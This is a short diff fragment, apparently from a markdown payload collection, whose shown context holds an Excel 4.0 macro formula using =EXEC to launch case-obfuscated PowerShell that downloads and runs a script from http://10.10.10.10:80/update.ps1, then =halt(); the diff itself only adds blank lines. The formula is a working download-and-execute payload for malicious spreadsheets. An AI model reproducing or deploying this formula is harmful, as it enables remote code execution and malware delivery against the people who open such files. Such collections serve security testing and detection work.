@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:51.948776+00:00'
 =EXEC("poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')")
 =halt()
 ```
+
+
